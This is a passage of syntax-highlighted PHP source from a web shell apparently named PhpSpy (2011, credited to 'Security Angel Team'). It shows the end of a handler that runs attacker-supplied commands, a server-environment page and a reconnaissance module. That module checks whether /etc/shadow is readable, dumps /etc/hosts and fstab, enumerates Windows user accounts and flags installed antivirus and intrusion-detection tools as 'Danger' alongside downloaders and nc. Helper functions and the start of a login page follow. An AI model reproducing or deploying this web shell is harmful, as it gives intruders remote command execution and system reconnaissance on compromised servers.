</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                fclose($pipes[2]);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                proc_close($process);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            echo (execute($command));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;&lt;/pre&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                } //end shell
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                elseif ($action == &#39;phpenv&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $upsize = getcfg(&#39;file_uploads&#39;) ? getcfg(&#39;upload_max_filesize&#39;) : &#39;Not allowed&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $adminmail = isset($_SERVER[&#39;SERVER_ADMIN&#39;]) ? $_SERVER[&#39;SERVER_ADMIN&#39;] : getcfg(&#39;sendmail_from&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    !$dis_func &amp;&amp; $dis_func = &#39;No&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $info = array(
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        1 =&gt; array(&#39;Server Time&#39;, date(&#39;Y/m/d h:i:s&#39;, $timestamp)),
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        2 =&gt; array(&#39;Server Domain&#39;, $_SERVER[&#39;SERVER_NAME&#39;]),
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        3 =&gt; array(&#39;Server IP&#39;, gethostbyname($_SERVER[&#39;SERVER_NAME&#39;])),
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        4 =&gt; array(&#39;Server OS&#39;, PHP_OS),
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        5 =&gt; array(&#39;Server OS Charset&#39;, $_SERVER[&#39;HTTP_ACCEPT_LANGUAGE&#39;]),
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        6 =&gt; array(&#39;Server Software&#39;, $_SERVER[&#39;SERVER_SOFTWARE&#39;]),
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        7 =&gt; array(&#39;Server Web Port&#39;, $_SERVER[&#39;SERVER_PORT&#39;]),
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        8 =&gt; array(&#39;PHP run mode&#39;, strtoupper(php_sapi_name())),
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        9 =&gt; array(&#39;The file path&#39;, __FILE__),
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        10 =&gt; array(&#39;PHP Version&#39;, PHP_VERSION),
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        11 =&gt; array(&#39;PHPINFO&#39;, (IS_PHPINFO ? &#39;&lt;a href=&#34;javascript:g(\&#39;phpinfo\&#39;);&#34;&gt;Yes&lt;/a&gt;&#39; : &#39;No&#39;)),
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        12 =&gt; array(&#39;Safe Mode&#39;, getcfg(&#39;safe_mode&#39;)),
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        13 =&gt; array(&#39;Administrator&#39;, $adminmail),
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        14 =&gt; array(&#39;allow_url_fopen&#39;, getcfg(&#39;allow_url_fopen&#39;)),
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        15 =&gt; array(&#39;enable_dl&#39;, getcfg(&#39;enable_dl&#39;)),
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        16 =&gt; array(&#39;display_errors&#39;, getcfg(&#39;display_errors&#39;)),
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        17 =&gt; array(&#39;register_globals&#39;, getcfg(&#39;register_globals&#39;)),
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        18 =&gt; array(&#39;magic_quotes_gpc&#39;, getcfg(&#39;magic_quotes_gpc&#39;)),
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        19 =&gt; array(&#39;memory_limit&#39;, getcfg(&#39;memory_limit&#39;)),
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        20 =&gt; array(&#39;post_max_size&#39;, getcfg(&#39;post_max_size&#39;)),
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        21 =&gt; array(&#39;upload_max_filesize&#39;, $upsize),
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        22 =&gt; array(&#39;max_execution_time&#39;, getcfg(&#39;max_execution_time&#39;) . &#39; second(s)&#39;),
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        23 =&gt; array(&#39;disable_functions&#39;, $dis_func),
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    );
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    if ($phpvarname) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        m($phpvarname . &#39; : &#39; . getcfg($phpvarname));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formhead(array(&#39;title&#39; =&gt; &#39;Server environment&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;action&#39;, &#39;phpenv&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makeinput(array(&#39;title&#39; =&gt; &#39;Please input PHP configuration parameter(eg:magic_quotes_gpc)&#39;, &#39;name&#39; =&gt; &#39;phpvarname&#39;, &#39;value&#39; =&gt; $phpvarname, &#39;newline&#39; =&gt; 1));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formfooter();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $hp = array(0 =&gt; &#39;Server&#39;, 1 =&gt; &#39;PHP&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    for ($a = 0; $a &lt; 2; $a++) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;&lt;h2&gt;&#39; . $hp[$a] . &#39; »&lt;/h2&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;&lt;ul class=&#34;info&#34;&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        if ($a == 0) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            for ($i = 1; $i &lt;= 9; $i++) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;li&gt;&lt;u&gt;&#39; . $info[$i][0] . &#39;:&lt;/u&gt;&#39; . $info[$i][1] . &#39;&lt;/li&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        } elseif ($a == 1) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            for ($i = 10; $i &lt;= 23; $i++) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;li&gt;&lt;u&gt;&#39; . $info[$i][0] . &#39;:&lt;/u&gt;&#39; . $info[$i][1] . &#39;&lt;/li&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;&lt;/ul&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                } //end phpenv
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                elseif ($action == &#39;secinfo&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    secparam(&#39;Server software&#39;, @getenv(&#39;SERVER_SOFTWARE&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    secparam(&#39;Disabled PHP Functions&#39;, ($GLOBALS[&#39;disable_functions&#39;]) ? $GLOBALS[&#39;disable_functions&#39;] : &#39;none&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    secparam(&#39;Open base dir&#39;, @ini_get(&#39;open_basedir&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    secparam(&#39;Safe mode exec dir&#39;, @ini_get(&#39;safe_mode_exec_dir&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    secparam(&#39;Safe mode include dir&#39;, @ini_get(&#39;safe_mode_include_dir&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    secparam(&#39;cURL support&#39;, function_exists(&#39;curl_version&#39;) ? &#39;enabled&#39; : &#39;no&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $temp = array();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    if (function_exists(&#39;mysql_get_client_info&#39;))
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $temp[] = &#34;MySql (&#34; . mysql_get_client_info() . &#34;)&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    if (function_exists(&#39;mssql_connect&#39;))
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $temp[] = &#34;MSSQL&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    if (function_exists(&#39;pg_connect&#39;))
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $temp[] = &#34;PostgreSQL&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    if (function_exists(&#39;oci_connect&#39;))
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $temp[] = &#34;Oracle&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    secparam(&#39;Supported databases&#39;, implode(&#39;, &#39;, $temp));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    if (!IS_WIN) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $userful = array(&#39;gcc&#39;, &#39;lcc&#39;, &#39;cc&#39;, &#39;ld&#39;, &#39;make&#39;, &#39;php&#39;, &#39;perl&#39;, &#39;python&#39;, &#39;ruby&#39;, &#39;tar&#39;, &#39;gzip&#39;, &#39;bzip&#39;, &#39;bzip2&#39;, &#39;nc&#39;, &#39;locate&#39;, &#39;suidperl&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $danger = array(&#39;kav&#39;, &#39;nod32&#39;, &#39;bdcored&#39;, &#39;uvscan&#39;, &#39;sav&#39;, &#39;drwebd&#39;, &#39;clamd&#39;, &#39;rkhunter&#39;, &#39;chkrootkit&#39;, &#39;iptables&#39;, &#39;ipfw&#39;, &#39;tripwire&#39;, &#39;shieldcc&#39;, &#39;portsentry&#39;, &#39;snort&#39;, &#39;ossec&#39;, &#39;lidsadm&#39;, &#39;tcplodg&#39;, &#39;sxid&#39;, &#39;logcheck&#39;, &#39;logwatch&#39;, &#39;sysmask&#39;, &#39;zmbscap&#39;, &#39;sawmill&#39;, &#39;wormscan&#39;, &#39;ninja&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $downloaders = array(&#39;wget&#39;, &#39;fetch&#39;, &#39;lynx&#39;, &#39;links&#39;, &#39;curl&#39;, &#39;get&#39;, &#39;lwp-mirror&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        secparam(&#39;Readable /etc/passwd&#39;, @is_readable(&#39;/etc/passwd&#39;) ? &#34;yes&#34; : &#39;no&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        secparam(&#39;Readable /etc/shadow&#39;, @is_readable(&#39;/etc/shadow&#39;) ? &#34;yes&#34; : &#39;no&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        secparam(&#39;OS version&#39;, @file_get_contents(&#39;/proc/version&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        secparam(&#39;Distr name&#39;, @file_get_contents(&#39;/etc/issue.net&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $safe_mode = @ini_get(&#39;safe_mode&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        if (!$GLOBALS[&#39;safe_mode&#39;]) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $temp = array();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            foreach ($userful as $item)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                if (which($item)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $temp[] = $item;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            secparam(&#39;Userful&#39;, implode(&#39;, &#39;, $temp));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $temp = array();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            foreach ($danger as $item)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                if (which($item)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $temp[] = $item;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            secparam(&#39;Danger&#39;, implode(&#39;, &#39;, $temp));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $temp = array();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            foreach ($downloaders as $item)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                if (which($item)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $temp[] = $item;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            secparam(&#39;Downloaders&#39;, implode(&#39;, &#39;, $temp));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            secparam(&#39;Hosts&#39;, @file_get_contents(&#39;/etc/hosts&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            secparam(&#39;HDD space&#39;, execute(&#39;df -h&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            secparam(&#39;Mount options&#39;, @file_get_contents(&#39;/etc/fstab&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        secparam(&#39;OS Version&#39;, execute(&#39;ver&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        secparam(&#39;Account Settings&#39;, execute(&#39;net accounts&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        secparam(&#39;User Accounts&#39;, execute(&#39;net user&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        secparam(&#39;IP Configurate&#39;, execute(&#39;ipconfig -all&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                } //end
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    m(&#39;Undefined Action&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                ?&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            &lt;/td&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;/tr&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;/table&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;div style=&#34;padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;span style=&#34;float:right;&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            &lt;?php debuginfo();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            ob_end_flush(); ?&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;/span&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        Powered by &lt;a title=&#34;Build 20110502&#34; href=&#34;http://www.4ngel.net&#34; target=&#34;_blank&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            &lt;?php echo str_replace(&#39;.&#39;, &#39;&#39;, &#39;P.h.p.S.p.y&#39;); ?&gt; 2011
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;/a&gt;. Copyright (C) 2004-2011 &lt;a href=&#34;http://www.4ngel.net&#34; target=&#34;_blank&#34;&gt;Security Angel Team [S4T]&lt;/a&gt; All
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        Rights Reserved.
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/body&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/html&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;?php
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">/*======================================================
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">函数库
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">======================================================*/
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function secparam($n, $v)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $v = trim($v);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if ($v) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        p(&#39;&lt;h2&gt;&#39; . $n . &#39; »&lt;/h2&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        p(&#39;&lt;div class=&#34;infolist&#34;&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        if (strpos($v, &#34;\n&#34;) === false)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            p($v . &#39;&lt;br /&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        else
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            p(&#39;&lt;pre&gt;&#39; . $v . &#39;&lt;/pre&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        p(&#39;&lt;/div&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function m($msg)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    echo &#39;&lt;div style=&#34;margin:10px auto 15px auto;background:#ffffe0;border:1px solid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;&#34;&gt;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    echo $msg;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    echo &#39;&lt;/div&gt;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function scookie($key, $value, $life = 0, $prefix = 1)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    global $timestamp, $_SERVER, $cookiepre, $cookiedomain, $cookiepath, $cookielife;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $key = ($prefix ? $cookiepre : &#39;&#39;) . $key;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $life = $life ? $life : $cookielife;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $useport = $_SERVER[&#39;SERVER_PORT&#39;] == 443 ? 1 : 0;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    setcookie($key, $value, $timestamp + $life, $cookiepath, $cookiedomain, $useport);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function multi($num, $perpage, $curpage, $tablename)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $multipage = &#39;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if ($num &gt; $perpage) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $page = 10;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $offset = 5;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $pages = @ceil($num / $perpage);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        if ($page &gt; $pages) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $from = 1;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $to = $pages;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $from = $curpage - $offset;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $to = $curpage + $page - $offset - 1;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if ($from &lt; 1) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                $to = $curpage + 1 - $from;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                $from = 1;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                if (($to - $from) &lt; $page &amp;&amp; ($to - $from) &lt; $pages) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $to = $page;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            } elseif ($to &gt; $pages) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                $from = $curpage - $pages + $to;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                $to = $pages;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                if (($to - $from) &lt; $page &amp;&amp; ($to - $from) &lt; $pages) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $from = $pages - $page + 1;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $multipage = ($curpage - $offset &gt; 1 &amp;&amp; $pages &gt; $page ? &#39;&lt;a href=&#34;javascript:settable(\&#39;&#39; . $tablename . &#39;\&#39;, \&#39;\&#39;, 1);&#34;&gt;First&lt;/a&gt; &#39; : &#39;&#39;) . ($curpage &gt; 1 ? &#39;&lt;a href=&#34;javascript:settable(\&#39;&#39; . $tablename . &#39;\&#39;, \&#39;\&#39;, &#39; . ($curpage - 1) . &#39;);&#34;&gt;Prev&lt;/a&gt; &#39; : &#39;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        for ($i = $from; $i &lt;= $to; $i++) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $multipage .= $i == $curpage ? $i . &#39; &#39; : &#39;&lt;a href=&#34;javascript:settable(\&#39;&#39; . $tablename . &#39;\&#39;, \&#39;\&#39;, &#39; . $i . &#39;);&#34;&gt;[&#39; . $i . &#39;]&lt;/a&gt; &#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $multipage .= ($curpage &lt; $pages ? &#39;&lt;a href=&#34;javascript:settable(\&#39;&#39; . $tablename . &#39;\&#39;, \&#39;\&#39;, &#39; . ($curpage + 1) . &#39;);&#34;&gt;Next&lt;/a&gt;&#39; : &#39;&#39;) . ($to &lt; $pages ? &#39; &lt;a href=&#34;javascript:settable(\&#39;&#39; . $tablename . &#39;\&#39;, \&#39;\&#39;, &#39; . $pages . &#39;);&#34;&gt;Last&lt;/a&gt;&#39; : &#39;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $multipage = $multipage ? &#39;&lt;p&gt;Pages: &#39; . $multipage . &#39;&lt;/p&gt;&#39; : &#39;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    return $multipage;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">// 登陆入口
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function loginpage()
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    ?&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;style type=&#34;text/css&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            input {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                font: 11px Verdana;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                BACKGROUND: #FFFFFF;
